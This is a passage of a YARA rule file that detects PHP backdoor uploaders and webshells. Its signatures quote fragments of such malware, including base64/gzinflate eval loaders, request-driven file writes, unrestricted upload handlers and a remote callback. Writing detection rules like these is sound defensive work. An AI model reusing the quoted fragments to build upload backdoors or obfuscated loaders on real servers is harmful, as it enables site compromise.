rule php_backdoor_uploader_070 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02815 and PR02816
}

private rule PR02817 : trigger
{
    strings:
        $ps0 = "$out=fopen($save_to, \"wb\");while ($chunk"
    condition:
        $ps0
}

rule php_backdoor_uploader_071 : backdoor
{
    strings:
        $trigger = "php');unlink($_SERVER['SCRIPT_FILENAME']);?>"
    condition:
        $trigger and PR02817 and PR01362
}

private rule PR02818 : trigger
{
    strings:
        $ps0 = "<option value=../../../../../../../../../..>10</option></select><br/><br/>"
    condition:
        $ps0
}

rule php_backdoor_uploader_072 : backdoor
{
    strings:
        $trigger = "move_uploaded_file"
    condition:
        $trigger and PR02818
}

private rule PR02819 : trigger
{
    strings:
        $ps0 = "@strpos($"
    condition:
        $ps0
}

private rule PR02820 : trigger
{
    strings:
        $ps0 = "\",\"a+\"); @fputs($"
    condition:
        $ps0
}

rule php_backdoor_uploader_073 : backdoor
{
    strings:
        $trigger = ":ptth\");"
    condition:
        $trigger and PR00092 and PR02819 and PR02820
}

private rule PR02821 : trigger
{
    strings:
        $ps0 = "if (@copy($files['tmp_name'], $fullpath)) {"
    condition:
        $ps0
}

rule php_backdoor_uploader_074 : backdoor
{
    strings:
        $trigger = "echo \"<h1><a href='$fullpath'>OK-Click"
    condition:
        $trigger and PR02821 and PR00507
}

private rule PR02822 : trigger
{
    strings:
        $ps0 = "echo\"<center><b>Done ==> $userfile_name"
    condition:
        $ps0
}

rule php_backdoor_uploader_075 : backdoor
{
    strings:
        $trigger = "if($_GET['up']){"
    condition:
        $trigger and PR01648 and PR02822
}

rule php_backdoor_uploader_075_02 : backdoor
{
    strings:
        $trigger = "echo '<center><font color=\"Red\" size"
    condition:
        $trigger and PR01648 and PR02822
}

rule php_backdoor_uploader_076 : backdoor
{
    strings:
        $trigger = "echo\" <a href=$userfile_name><center><b>Sucess Upload :D ==> $userfile_name</b></center></a>\";"
    condition:
        $trigger and PR01648
}

private rule PR02823 : trigger
{
    strings:
        $ps0 = "echo $_FILES[\"filename\"][\"name\"];"
    condition:
        $ps0
}

rule php_backdoor_uploader_077 : backdoor
{
    strings:
        $trigger = "if ($mode=='upload') {"
    condition:
        $trigger and PR01648 and PR02823
}

rule php_backdoor_uploader_078 : backdoor
{
    strings:
        $trigger = "shell = @file_get_contents(\"$"
    condition:
        $trigger and PR02700
}

rule php_backdoor_uploader_079 : backdoor
{
    strings:
        $trigger = "curl_init (\"$target/wp-admin"
    condition:
        $trigger and PR01425
}

rule php_backdoor_uploader_080 : backdoor
{
    strings:
        $trigger = ">Uploader by Rabbit"
    condition:
        $trigger and PR00039
}

private rule PR02824 : trigger
{
    strings:
        $ps0 = "file_put_contents($_GET['fpath'], base64_decode($_REQUEST['data'])"
    condition:
        $ps0
}

rule php_backdoor_uploader_081 : backdoor
{
    strings:
        $trigger = "die('!~'.'!'.$_GET['fpath'].'!'.'~!');"
    condition:
        $trigger and PR02824
}

rule php_backdoor_uploader_082 : backdoor
{
    strings:
        $trigger = "Z-Pong:"
    condition:
        $trigger and PR00435
}

rule php_backdoor_uploader_083 : backdoor
{
    strings:
        $trigger = "// Mr.CrazyweB"
    condition:
        $trigger and PR00039
}

private rule PR02825 : trigger
{
    strings:
        $ps0 = "setcookie(md5($_SERVER['HTTP_HOST']), $"
    condition:
        $ps0
}

rule php_backdoor_uploader_084 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR02825
}

private rule PR02826 : trigger
{
    strings:
        $ps0 = "$res=url_get_mini($url_to,"
    condition:
        $ps0
}

rule php_backdoor_uploader_085 : backdoor
{
    strings:
        $trigger = "$wrdir.\"/\".$wrpre.\"_\".md5($secretkey"
    condition:
        $trigger and PR02826
}

private rule PR02827 : trigger
{
    strings:
        $ps0 = "echo \"<h1>Not Found</h1>"
    condition:
        $ps0
}

rule php_backdoor_uploader_087 : backdoor
{
    strings:
        $trigger = "echo \"<a href=\\\"http://\".$_SERVER[\"HTTP_HOST\"].str_ireplace($ss, $_FILES[\"filename\"][\"name\"], $_SERVER"
    condition:
        $trigger and PR01648 and PR02827
}

rule php_backdoor_uploader_088 : backdoor
{
    strings:
        $trigger = "$errno,$errstr,$errfile,$errline){array_map(create_function('',$errstr),array(''));}"
    condition:
        $trigger
}

private rule PR02828 : trigger
{
    strings:
        $ps0 = "php', w); fwrite($"
    condition:
        $ps0
}

private rule PR02829 : trigger
{
    strings:
        $ps0 = "){unlink($"
    condition:
        $ps0
}

private rule PR02830 : trigger
{
    strings:
        $ps0 = "mkdir("
    condition:
        $ps0
}

private rule PR02831 : trigger
{
    strings:
        $ps0 = "php')) die();"
    condition:
        $ps0
}

private rule PR02832 : trigger
{
    strings:
        $ps0 = ", 0777);"
    condition:
        $ps0
}

private rule PR02833 : trigger
{
    strings:
        $ps0 = ".\"\\n\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_089 : backdoor
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR02828 and PR02829 and PR02830 and PR02831 and PR02832 and PR02833
}

rule php_backdoor_uploader_090 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('hZFha8IwEIa/C/6HEgQ"
    condition:
        $trigger
}

rule php_backdoor_uploader_091 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(\"hVVtk5pIEP5sqvIfJpZ1A3uIaHT"
    condition:
        $trigger
}

rule php_backdoor_uploader_092 : backdoor
{
    strings:
        $trigger = "file_put_contents($fuckfile,base64_decode"
    condition:
        $trigger and PR00013
}

private rule PR02834 : trigger
{
    strings:
        $ps0 = "echo '<html><head><title>Upload files"
    condition:
        $ps0
}

rule php_backdoor_uploader_093 : backdoor
{
    strings:
        $trigger = "echo \"<h1><a href='$fullpath'>OK-Click"
    condition:
        $trigger and PR02834 and PR00507
}

private rule PR02835 : trigger
{
    strings:
        $ps0 = "if ( @copy('https://paste"
    condition:
        $ps0
}

rule php_backdoor_uploader_094 : backdoor
{
    strings:
        $trigger = "echo \"Copy success!\";"
    condition:
        $trigger and PR02835
}

private rule PR02836 : trigger
{
    strings:
        $ps0 = ".chr("
    condition:
        $ps0
}

private rule PR02837 : trigger
{
    strings:
        $ps0 = ",'<?php '.$m);include("
    condition:
        $ps0
}

rule php_backdoor_uploader_095 : backdoor
{
    strings:
        $trigger = "]);file_put_contents("
    condition:
        $trigger and PR02836 and PR02837
}

private rule PR02838 : trigger
{
    strings:
        $ps0 = "if(isset($_GET['check'])){"
    condition:
        $ps0
}

private rule PR02839 : trigger
{
    strings:
        $ps0 = "$content = file_get_contents($file);"
    condition:
        $ps0
}

rule php_backdoor_uploader_097 : backdoor
{
    strings:
        $trigger = "file_put_contents($_GET['name'], $content);"
    condition:
        $trigger and PR02838 and PR01837 and PR02839
}

private rule PR02840 : trigger
{
    strings:
        $ps0 = "$keylog = $_POST['inp'];"
    condition:
        $ps0
}

rule php_backdoor_uploader_098 : backdoor
{
    strings:
        $trigger = "fwrit"
    condition:
        $trigger and PR02840
}

private rule PR02841 : trigger
{
    strings:
        $ps0 = "modules/simpleslideshow/uploadimage.php"
    condition:
        $ps0
}

rule php_backdoor_uploader_099 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02841 and PR00357
}

private rule PR02842 : trigger
{
    strings:
        $ps0 = "index.php?option=com_"
    condition:
        $ps0
}

private rule PR02843 : trigger
{
    strings:
        $ps0 = "hack"
    condition:
        $ps0
}

private rule PR02844 : trigger
{
    strings:
        $ps0 = "ot infected"
    condition:
        $ps0
}

rule php_backdoor_uploader_100 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01021 and PR02842 and PR02843 and PR02844
}

private rule PR02845 : trigger
{
    strings:
        $ps0 = "(\"<br>Done!<br>\");"
    condition:
        $ps0
}

rule php_backdoor_uploader_101 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR02845
}

private rule PR02846 : trigger
{
    strings:
        $ps0 = "$sitemap .= '<url><loc>'.$link.'</loc><mobile:mobile/></url>';"
    condition:
        $ps0
}

rule php_backdoor_uploader_102 : backdoor
{
    strings:
        $trigger = "if($nend > $end){ $nend = $end; }"
    condition:
        $trigger and PR00435 and PR02846
}

private rule PR02847 : trigger
{
    strings:
        $ps0 = "unlink(str_replace("
    condition:
        $ps0
}

rule php_backdoor_uploader_103 : backdoor
{
    strings:
        $trigger = "else { $result = \"SUCCESS IN\";"
    condition:
        $trigger and PR02847
}

private rule PR02848 : trigger
{
    strings:
        $ps0 = "?(@copy($_FILES[x][tmp_name],$_FILES[x][name])):0):0;"
    condition:
        $ps0
}

rule php_backdoor_uploader_104 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02848 and PR01479
}

rule php_backdoor_uploader_105 : backdoor
{
    strings:
        $trigger = "<title>Unzip a zip file to the webserver</title>"
    condition:
        $trigger
}

rule php_backdoor_uploader_106 : backdoor
{
    strings:
        $trigger = "move_uploaded_file($nemo"
    condition:
        $trigger and PR00013
}

private rule PR02849 : trigger
{
    strings:
        $ps0 = "$current . \"&mode=upload' method = 'POST' ENCTYPE='multipart/form-data'>\\n\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_107 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR02849 and PR01648 and PR01021
}

rule php_backdoor_uploader_108 : backdoor
{
    strings:
        $trigger = "</form>';if(isset($_POST['g'])"
    condition:
        $trigger
}

private rule PR02850 : trigger
{
    strings:
        $ps0 = "echo '<a href='.$file."
    condition:
        $ps0
}

private rule PR02851 : trigger
{
    strings:
        $ps0 = "echo(\"FILE"
    condition:
        $ps0
}

rule php_backdoor_uploader_109 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR02850 and PR01648 and PR02851
}

private rule PR02852 : trigger
{
    strings:
        $ps0 = "echo \"<!-- 'filename.php','chmod')\\\"><font color=green"
    condition:
        $ps0
}

rule php_backdoor_uploader_110 : backdoor
{
    strings:
        $trigger = "File"
    condition:
        $trigger and PR02852
}

private rule PR02853 : trigger
{
    strings:
        $ps0 = ">file $values is empty!</div><br/>"
    condition:
        $ps0
}

rule php_backdoor_uploader_111 : backdoor
{
    strings:
        $trigger = "@chmod($"
    condition:
        $trigger and PR01401 and PR02853
}

rule php_backdoor_uploader_112 : backdoor
{
    strings:
        $trigger = "eval(gzuncompress(str_rot13(base64_decode('a5x6Q9FXwzAUfbZfZLkM"
    condition:
        $trigger
}

rule php_backdoor_uploader_113 : backdoor
{
    strings:
        $trigger = "file_put_contents(@$_SERVER[HTTP_FILENAME],base64_decode(@$_SERVER["
    condition:
        $trigger
}

private rule PR02854 : trigger
{
    strings:
        $ps0 = "print \"OK\";"
    condition:
        $ps0
}

rule php_backdoor_uploader_114 : backdoor
{
    strings:
        $trigger = "touch($self.DIRECTORY_SEPARATOR.$_FILES[\"uploadFile\"][\"name\"], $time);"
    condition:
        $trigger and PR01648 and PR02854
}

rule php_backdoor_uploader_115 : backdoor
{
    strings:
        $trigger = "move_uploaded_file($_FILES[file][tmp_name], $script_directory"
    condition:
        $trigger
}

private rule PR02855 : trigger
{
    strings:
        $ps0 = "$uploadContents = preg_replace(\"($md5 != \\\"(.*?)\\\")\",\"$md5 != \\\"\".$newMD5.\"\\\"\",file_get_contents(\"upload.php\"));"
    condition:
        $ps0
}

rule php_backdoor_uploader_116 : backdoor
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR00355 and PR02855
}

rule php_backdoor_uploader_117 : backdoor
{
    strings:
        $trigger = "echo 'status_ok:'.dirname(__FILE__).'/'.$_FILES[\"pictures\"][\"name\"];"
    condition:
        $trigger and PR01648
}

private rule PR02856 : trigger
{
    strings:
        $ps0 = "components"
    condition:
        $ps0
}

private rule PR02857 : trigger
{
    strings:
        $ps0 = "unlink(MyFileName());"
    condition:
        $ps0
}

rule php_backdoor_uploader_118 : backdoor
{
    strings:
        $trigger = "wp-content"
    condition:
        $trigger and PR02856 and PR01479 and PR02857
}

private rule PR02858 : trigger
{
    strings:
        $ps0 = "return \"/wp-"
    condition:
        $ps0
}

private rule PR02859 : trigger
{
    strings:
        $ps0 = "$user_agent = $_SERVER['HTTP_USER_AGENT'];"
    condition:
        $ps0
}

private rule PR02860 : trigger
{
    strings:
        $ps0 = "$result = file_put_contents($"
    condition:
        $ps0
}

rule php_backdoor_uploader_119 : backdoor
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR02858 and PR02859 and PR02860
}

rule php_backdoor_uploader_120 : backdoor
{
    strings:
        $trigger = "if(@copy($_FILES[\"emad\"][\"tmp_name\"],$_FILES[\"emad\"][\"name\"])){echo"
    condition:
        $trigger
}

private rule PR02861 : trigger
{
    strings:
        $ps0 = "strpos($pDirs[$ind], $ignoreshit)"
    condition:
        $ps0
}

rule php_backdoor_uploader_121 : backdoor
{
    strings:
        $trigger = "unlink(MyFileName());"
    condition:
        $trigger and PR02861 and PR01479
}

rule php_backdoor_uploader_122 : backdoor
{
    strings:
        $trigger = "if(!empty($_FILES[file][tmp_name])){copy($_FILES[file][tmp_name],$_FILES[file][name]);}"
    condition:
        $trigger
}

private rule PR02862 : trigger
{
    strings:
        $ps0 = "$contents=@fread($"
    condition:
        $ps0
}

private rule PR02863 : trigger
{
    strings:
        $ps0 = "ORM ENCTYPE=\"multipart/form-data\" METHOD=\"POST\""
    condition:
        $ps0
}

rule php_backdoor_uploader_123 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR02862 and PR02863
}

private rule PR02864 : trigger
{
    strings:
        $ps0 = "}echo '<html><head><title>Upload files"
    condition:
        $ps0
}

private rule PR02865 : trigger
{
    strings:
        $ps0 = "if (move_uploaded_file($files['tmp_name'], $fullpath)) {"
    condition:
        $ps0
}

rule php_backdoor_uploader_124 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR02864 and PR02865
}

private rule PR02866 : trigger
{
    strings:
        $ps0 = "f($params['ss'] == 'tt')"
    condition:
        $ps0
}

private rule PR02867 : trigger
{
    strings:
        $ps0 = "if (strpos($userAgent,'Windows"
    condition:
        $ps0
}

rule php_backdoor_uploader_125 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR02866 and PR01021 and PR02867
}

private rule PR02868 : trigger
{
    strings:
        $ps0 = "<?php if($_GET[\""
    condition:
        $ps0
}

private rule PR02869 : trigger
{
    strings:
        $ps0 = "){?><form enctype="
    condition:
        $ps0
}

private rule PR02870 : trigger
{
    strings:
        $ps0 = "$_FILES["
    condition:
        $ps0
}

rule php_backdoor_uploader_126 : backdoor
{
    strings:
        $trigger = "){if (!move_uploaded_file($"
    condition:
        $trigger and PR02868 and PR01021 and PR02869 and PR02870
}

private rule PR02871 : trigger
{
    strings:
        $ps0 = "'........"
    condition:
        $ps0
}

rule php_backdoor_uploader_127 : backdoor
{
    strings:
        $trigger = "])];} eval($"
    condition:
        $trigger and PR02871
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_128 : backdoor
{
    strings:
        $trigger = "echo '<font color=\"green\">'.$_FILES['file']['name']"
        $php_backdoor_uploader_128_r0 = /echo\s*['\"]\s*<form\s*method=['\"]POST['\"]\s*enctype=['\"]multipart\/form-data['\"]/
    condition:
        $trigger and PR01648 and $php_backdoor_uploader_128_r0
}

private rule PR02872 : trigger
{
    strings:
        $ps0 = "], 0775) or die"
    condition:
        $ps0
}

rule php_backdoor_uploader_129 : backdoor
{
    strings:
        $trigger = "= fopen($_POST['folder'].\"/\".$url.\".txt\",\"w\");"
    condition:
        $trigger and PR02872 and PR01522
}

private rule PR02873 : trigger
{
    strings:
        $ps0 = "value='G_Bl0k Security Team"
    condition:
        $ps0
}

private rule PR02874 : trigger
{
    strings:
        $ps0 = "$url"
    condition:
        $ps0
}

private rule PR02875 : trigger
{
    strings:
        $ps0 = "='http"
    condition:
        $ps0
}

rule php_backdoor_uploader_130 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02873 and PR02874 and PR02875
}

private rule PR02876 : trigger
{
    strings:
        $ps0 = ".\"/wp-admin/includes/\".\""
    condition:
        $ps0
}

rule php_backdoor_uploader_131 : backdoor
{
    strings:
        $trigger = "=dirname(dirname(dirname(dirname(__FILE__))));"
    condition:
        $trigger and PR00435 and PR02876
}

private rule PR02877 : trigger
{
    strings:
        $ps0 = "echo \"url:\".$_FILES[\"upfile\"][\"name\"];if(!file_exists($_FILES[\"upfile"
    condition:
        $ps0
}

rule php_backdoor_uploader_132 : backdoor
{
    strings:
        $trigger = "\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo"
    condition:
        $trigger and PR02877
}

private rule PR02878 : trigger
{
    strings:
        $ps0 = "]('ZGlzcGxheV9lcnJvcnM='),$GLOBALS"
    condition:
        $ps0
}

rule php_backdoor_uploader_133 : backdoor
{
    strings:
        $trigger = "$II"
    condition:
        $trigger and PR02878 and PR01431
}

rule php_backdoor_uploader_134 : backdoor
{
    strings:
        $trigger = ">Hacked By"
    condition:
        $trigger and PR02388
}

private rule PR02879 : trigger
{
    strings:
        $ps0 = "$J930031B7214E1A8BE6AAA37CC6C1C619"
    condition:
        $ps0
}

rule php_backdoor_uploader_135 : backdoor
{
    strings:
        $trigger = "eval(base64_decode(gzuncompress(base64_decode($"
    condition:
        $trigger and PR02879
}

private rule PR02880 : trigger
{
    strings:
        $ps0 = "copy($_FILES[\"file\"][\"tmp_name\"]"
    condition:
        $ps0
}

rule php_backdoor_uploader_137 : backdoor
{
    strings:
        $trigger = "eval(getBot("
    condition:
        $trigger and PR02880
}

private rule PR02881 : trigger
{
    strings:
        $ps0 = "$nowaddress <input type=file name=elif ><input type=submit value=Upload"
    condition:
        $ps0
}

rule php_backdoor_uploader_138 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR01021 and PR02881
}

rule php_backdoor_uploader_139 : backdoor
{
    strings:
        $trigger = "$stream=@fopen($_REQUEST['ef'],\"w\");"
    condition:
        $trigger and PR01351
}

rule php_backdoor_uploader_140 : backdoor
{
    strings:
        $trigger = "move_uploaded_file($userfile, \"entrika.php\");"
    condition:
        $trigger
}

private rule PR02882 : trigger
{
    strings:
        $ps0 = "!empty($_POST['path'])) ? $_POST['path'] : getcwd();"
    condition:
        $ps0
}

private rule PR02883 : trigger
{
    strings:
        $ps0 = ">Path To Upload<"
    condition:
        $ps0
}

rule php_backdoor_uploader_141 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR01021 and PR02882 and PR02883
}

rule php_backdoor_uploader_142 : backdoor
{
    strings:
        $trigger = "eval(base64_decode(\"ZWNobyAnPGI+Jy5waHBfdW5hbWUoKS4n"
    condition:
        $trigger
}

rule php_backdoor_uploader_143 : backdoor
{
    strings:
        $trigger = ">Eval(PHP):&nbsp;<input type=\"text\" name=\"eval\"><input type=\"submit\" value=\"Execute\"></form><form method=\"get\""
    condition:
        $trigger and PR00355 and PR00357 and PR01431
}

private rule PR02884 : trigger
{
    strings:
        $ps0 = "JE8wTzAwMD0id01USnNkY0ZpVXFvWk5PUGJHcFloQmVqbEh1dHJ5QXZtRHpDZ1JhRVZmU1hRV2tLSXhuTHhGT2Np"
    condition:
        $ps0
}

rule php_backdoor_uploader_144 : backdoor
{
    strings:
        $trigger = "ZXZ"
    condition:
        $trigger and PR02884
}

rule php_backdoor_uploader_145 : backdoor
{
    strings:
        $trigger = "move_uploaded_file($devtun,$devshell);"
    condition:
        $trigger
}

private rule PR02885 : trigger
{
    strings:
        $ps0 = "$data = file_get_contents('php://input');"
    condition:
        $ps0
}

rule php_backdoor_uploader_146 : backdoor
{
    strings:
        $trigger = "die(substr(md5(microtime()), rand("
    condition:
        $trigger and PR02885
}

rule php_backdoor_uploader_147 : backdoor
{
    strings:
        $trigger = "$Remote_server.\"/Parasite?host=\".$host_name);"
    condition:
        $trigger and PR01401
}

private rule PR02886 : trigger
{
    strings:
        $ps0 = "$uploaddir = \"\";"
    condition:
        $ps0
}

private rule PR02887 : trigger
{
    strings:
        $ps0 = "move_uploaded_file($_FILES['userfile']['tmp_name"
    condition:
        $ps0
}

rule php_backdoor_uploader_148 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02886 and PR02887
}

private rule PR02888 : trigger
{
    strings:
        $ps0 = ") { echo ' - <span class=\"label label-success\">"
    condition:
        $ps0
}

rule php_backdoor_uploader_149 : backdoor
{
    strings:
        $trigger = "fwrit"
    condition:
        $trigger and PR02888
}

rule php_backdoor_uploader_150 : backdoor
{
    strings:
        $trigger = "target_path)){echo basename($_FILES[\"uploadedfile\"][\"name\"])"
    condition:
        $trigger and PR01648
}

private rule PR02889 : trigger
{
    strings:
        $ps0 = "substr($randStr"
    condition:
        $ps0
}

rule php_backdoor_uploader_150_02 : backdoor
{
    strings:
        $trigger = "target_path)){echo basename($_FILES[\"uploadedfile\"][\"name\"])"
    condition:
        $trigger and PR02889 and PR01648
}

private rule PR02890 : trigger
{
    strings:
        $ps0 = "if($_GET[\"login\"]"
    condition:
        $ps0
}

rule php_backdoor_uploader_150_03 : backdoor
{
    strings:
        $trigger = "target_path)){echo basename($_FILES[\"uploadedfile\"][\"name\"])"
    condition:
        $trigger and PR01648 and PR02890
}

private rule PR02891 : trigger
{
    strings:
        $ps0 = "value=\"xunknown hacktn"
    condition:
        $ps0
}

rule php_backdoor_uploader_151 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR01021 and PR02891
}

rule php_backdoor_uploader_152 : backdoor
{
    strings:
        $trigger = "?> - Web Explorer</title>"
    condition:
        $trigger and PR00042
}

rule php_backdoor_uploader_153 : backdoor
{
    strings:
        $trigger = "JO Hack3r"
    condition:
        $trigger
}

rule php_backdoor_uploader_154 : backdoor
{
    strings:
        $trigger = "$file = fread($fh, filesize(\"govno.jpg\"));"
    condition:
        $trigger and PR01362
}

rule php_backdoor_uploader_155 : backdoor
{
    strings:
        $trigger = "/mailer.zip\", fetch_url("
    condition:
        $trigger and PR00435 and PR00341
}

private rule PR02892 : trigger
{
    strings:
        $ps0 = "function ev(){return __FUNCTION__.\"al\""
    condition:
        $ps0
}

rule php_backdoor_uploader_156 : backdoor
{
    strings:
        $trigger = "eva"
    condition:
        $trigger and PR02892
}

private rule PR02893 : trigger
{
    strings:
        $ps0 = "$myUpload = new maxUpload();"
    condition:
        $ps0
}

rule php_backdoor_uploader_157 : backdoor
{
    strings:
        $trigger = "echo '<p class=\"msg\">'.$msg.'</p>';"
    condition:
        $trigger and PR02893 and PR01490
}

private rule PR02894 : trigger
{
    strings:
        $ps0 = "<?php @move_uploaded_file($_FILES["
    condition:
        $ps0
}

private rule PR02895 : trigger
{
    strings:
        $ps0 = "]['name']);?>"
    condition:
        $ps0
}

rule php_backdoor_uploader_159 : backdoor
{
    strings:
        $trigger = "]['tmp_name'],$_FILES["
    condition:
        $trigger and PR02894 and PR02895
}

private rule PR02896 : trigger
{
    strings:
        $ps0 = "]);};if($_POST['l']){file_put_contents('editor.php"
    condition:
        $ps0
}

rule php_backdoor_uploader_160 : backdoor
{
    strings:
        $trigger = "]['tmp_name'],$_FILES["
    condition:
        $trigger and PR01332 and PR02896
}

private rule PR02897 : trigger
{
    strings:
        $ps0 = "$xml_link = 'http://'.$domain.'/'.$filename.'?sitemap=v&id='.$id;"
    condition:
        $ps0
}

rule php_backdoor_uploader_161 : backdoor
{
    strings:
        $trigger = "header(\"Refresh: 0; url=http://\".$mainip.\"/go.php"
    condition:
        $trigger and PR01332 and PR02897
}

// MANUAL FIX NECESSARY
rule php_backdoor_uploader_162 : backdoor
{
    strings:
        $trigger = "@move_uploaded_file"
        $php_backdoor_uploader_162_r0 = /<\?php[\s]*for\(\$i=0[^{]+\{[\s]*if\(!@move_uploaded_file\(\$_FILES[^{]+\{[\s]*echo \"Can.t upload file: \{\$_FILES/
    condition:
        $trigger and $php_backdoor_uploader_162_r0
}

rule php_backdoor_uploader_163 : backdoor
{
    strings:
        $trigger = "$uf=@basename($_FILES['uf']['name']);if(@move_uploaded_file($_FILES['uf']['tmp_name'],$uf)) echo $uf;"
    condition:
        $trigger
}

private rule PR02898 : trigger
{
    strings:
        $ps0 = "type=\"text/javascript\">window.top.window.stopUpload(<?php echo $result;"
    condition:
        $ps0
}

private rule PR02899 : trigger
{
    strings:
        $ps0 = "if(@move_uploaded_file($_FILES['myfile']['tmp_name'], $target_path)) {"
    condition:
        $ps0
}

rule php_backdoor_uploader_164 : backdoor
{
    strings:
        $trigger = "sleep(1);"
    condition:
        $trigger and PR02898 and PR02899
}

private rule PR02900 : trigger
{
    strings:
        $ps0 = "else die('<h1>Not Found</h1>"
    condition:
        $ps0
}

rule php_backdoor_uploader_165 : backdoor
{
    strings:
        $trigger = "$target_path = $this->uploadLocation.basename($_FILES["
    condition:
        $trigger and PR01332 and PR02900
}

private rule PR02901 : trigger
{
    strings:
        $ps0 = "Upload GAGAL"
    condition:
        $ps0
}

rule php_backdoor_uploader_166 : backdoor
{
    strings:
        $trigger = "echo '<b><br><br>'.php_uname().'<br></b>';"
    condition:
        $trigger and PR02901 and PR00507 and PR02810
}

private rule PR02902 : trigger
{
    strings:
        $ps0 = "$_FILES['file']['name'])) { echo '<b>Ups !!!"
    condition:
        $ps0
}

rule php_backdoor_uploader_167 : backdoor
{
    strings:
        $trigger = "if( $_POST['_upl'] == \"Upload\" )"
    condition:
        $trigger and PR01332 and PR02902
}

private rule PR02903 : trigger
{
    strings:
        $ps0 = "if( $_POST['_act'] == \"Upload!\" ) {"
    condition:
        $ps0
}

rule php_backdoor_uploader_168 : backdoor
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR02458 and PR02903
}

private rule PR02904 : trigger
{
    strings:
        $ps0 = "(empty($_POST['security_code'])) ?"
    condition:
        $ps0
}

rule php_backdoor_uploader_169_02 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR02904
}

private rule PR02905 : trigger
{
    strings:
        $ps0 = "*/if(!empty($_SERVER['HTTP_USER_AGENT"
    condition:
        $ps0
}

private rule PR02906 : trigger
{
    strings:
        $ps0 = "security_code'];if(!$sec)$sec=\".\";$sec=rtrim"
    condition:
        $ps0
}

rule php_backdoor_uploader_169_03 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR02905 and PR02906
}

private rule PR02907 : trigger
{
    strings:
        $ps0 = "*/$uAs=array("
    condition:
        $ps0
}

rule php_backdoor_uploader_169_04 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR02907 and PR02906
}

private rule PR02908 : trigger
{
    strings:
        $ps0 = "])){header('HTTP/1.0 404 Not Found');exit;}}/*"
    condition:
        $ps0
}

rule php_backdoor_uploader_169_05 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR02908 and PR02906
}

private rule PR02909 : trigger
{
    strings:
        $ps0 = "$a='as';"
    condition:
        $ps0
}

rule php_backdoor_uploader_169_06 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR02909 and PR02906
}

private rule PR02910 : trigger
{
    strings:
        $ps0 = "*/if(!empty($_FILES['message']['name']) AND (md5($_POST"
    condition:
        $ps0
}

rule php_backdoor_uploader_169_07 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR02910 and PR02906
}

private rule PR02911 : trigger
{
    strings:
        $ps0 = "\".\";$sec=rtrim($sec,\"/\");/*"
    condition:
        $ps0
}

rule php_backdoor_uploader_169_08 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR02911 and PR02906
}

private rule PR02912 : trigger
{
    strings:
        $ps0 = "*/$t=$_FILES['message']['tmp_name'];$name=$_FILES"
    condition:
        $ps0
}

rule php_backdoor_uploader_169_09 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR02906 and PR02912
}

private rule PR02913 : trigger
{
    strings:
        $ps0 = "*/@move_uploaded_file($t, $sec"
    condition:
        $ps0
}

rule php_backdoor_uploader_169_10 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR02913 and PR02906
}

private rule PR02914 : trigger
{
    strings:
        $ps0 = "print '<html><head><title>"
    condition:
        $ps0
}

rule php_backdoor_uploader_169_11 : backdoor
{
    strings:
        $trigger = "md5($_POST["
    condition:
        $trigger and PR02906 and PR02914
}

private rule PR02915 : trigger
{
    strings:
        $ps0 = "chmod('encrypter_saint_777.php',0755);"
    condition:
        $ps0
}

rule php_backdoor_uploader_172 : backdoor
{
    strings:
        $trigger = "move_uploaded_file"
    condition:
        $trigger and PR02915
}

private rule PR02916 : trigger
{
    strings:
        $ps0 = "echo \"feature_images/\".$t.$name;"
    condition:
        $ps0
}

rule php_backdoor_uploader_173 : backdoor
{
    strings:
        $trigger = "$_FILES["
    condition:
        $trigger and PR01648 and PR02916
}

rule php_backdoor_uploader_174 : backdoor
{
    strings:
        $trigger = "move_uploaded_file($_FILES[\"file\"][\"tmp_name\"][$index],\"uploads/\" . $filename);"
    condition:
        $trigger and PR01458
}

private rule PR02917 : trigger
{
    strings:
        $ps0 = "$newfile = uniqid(\"image_\").\".\".$extension;"
    condition:
        $ps0
}

rule php_backdoor_uploader_175 : backdoor
{
    strings:
        $trigger = "move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"Images/\" . $_FILES[\"file\"][\"name\"]);"
    condition:
        $trigger and PR02917 and PR01021
}

rule php_backdoor_uploader_176 : backdoor
{
    strings:
